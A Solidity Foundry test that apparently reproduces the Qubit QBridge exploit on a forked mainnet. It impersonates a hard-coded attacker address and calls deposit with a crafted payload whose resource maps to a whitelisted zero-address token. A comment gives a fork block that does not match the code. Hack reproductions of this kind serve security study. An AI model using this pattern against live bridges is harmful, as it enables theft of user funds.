// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface IQBridge {
  function deposit(uint8 destinationDomainID, bytes32 resourceID, bytes calldata data) external payable;
}
interface IQBridgeHandler {
  // mapping(address => bool) public contractWhitelist;
  function resourceIDToTokenContractAddress(bytes32) external returns (address);
  function contractWhitelist(address) external returns (bool);
  function deposit(bytes32 resourceID, address depositer, bytes calldata data) external;
}

contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  address attacker = 0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7;
  //this new Qbriddge contract is from transaction confirmed 30 days ago
  address QBridge = 0x0B6b31B277FF5825E46E4adcC377b23aE466A48b;
  address QBridgeHandler = 0x80D1486eF600cc56d4df9ed33bAF53C60D5A629b;

 // CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheat.createSelectFork("mainnet", 15620469); //fork mainnet at block 14090169
  }

  function testExploit() public {
    cheat.startPrank(attacker);
    // emit log_named_uint(
    //   "Before exploiting, attacker OP Balance:",
    //   op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
    // );
    bytes32 resourceID = hex"00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01";
    bytes memory data = hex"000000000000000000000000000000000000000000000000000000000000006900000000000000000000000000000000000000000000000a4cc799563c380000000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7";
    uint option;
    uint amount;
    (option, amount) = abi.decode(data, (uint, uint));
    emit log_named_uint("option", option);
    emit log_named_uint("amount", amount);
    // which calls in turn:
    // IQBridgeHandler(QBridgeHandler).deposit(resourceID, attacker, data);
    emit log_named_address("contractAddress", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID));
    emit log_named_uint("is 0 address whitelisted", IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0)) ? 1 : 0);

    IQBridge(QBridge).deposit(1, resourceID, data);


  }

  receive() external payable {}
}
